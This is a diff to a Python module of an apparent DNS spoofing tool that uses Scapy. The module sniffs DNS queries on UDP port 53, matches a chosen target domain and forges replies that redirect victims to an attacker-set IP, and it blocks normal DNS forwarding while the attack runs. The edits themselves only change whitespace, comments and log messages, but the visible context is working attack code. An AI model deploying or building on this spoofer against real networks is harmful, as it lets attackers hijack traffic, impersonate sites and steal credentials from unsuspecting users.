@@ -4,13 +4,11 @@ import time
 from . import STATUS, STOP_EVENT
 from .utils import log_msg, set_dns_blocking
 
-
 # DNS Spoofing State
-
 LOG_COOLDOWN = {} 
+
 # DNS Packet Interception & Spoofing
 def dns_spoofer(packet):
-  
     # Stop processing if attack has been stopped from Flask
     if STOP_EVENT.is_set(): 
         return
@@ -26,16 +24,16 @@ def dns_spoofer(packet):
             fake_ip = STATUS.get("dns_ip")
             
             if target_domain and target_domain in qname:
-                #SPAM FILTER: Prevent log flooding
+                # SPAM FILTER: Prevent log flooding
                 current_time = time.time()
                 last_log = LOG_COOLDOWN.get(qname, 0)
                 
                 # Only log if 3 seconds have passed since last log for this domain
                 if current_time - last_log > 3:
-                    log_msg(f"Trapped DNS: {qname} -> Redirecting to {fake_ip}")
+                    log_msg(f"[DNS] SPOOFED: {qname} -> {fake_ip}")
                     LOG_COOLDOWN[qname] = current_time
 
-                #Craft Forged DNS Response
+                # Craft Forged DNS Response
                 scapy_ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
                 scapy_udp = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
                 
@@ -61,6 +59,7 @@ def dns_spoofer(packet):
 
 def start_dns_spoofing():
     try:
+        log_msg("[CONFIG] DNS Forwarding: DISABLED (Intercepting requests)")
         set_dns_blocking(True) 
         scapy.sniff(filter="udp port 53", prn=dns_spoofer, iface=STATUS["interface"], stop_filter=lambda x: STOP_EVENT.is_set())
     finally:
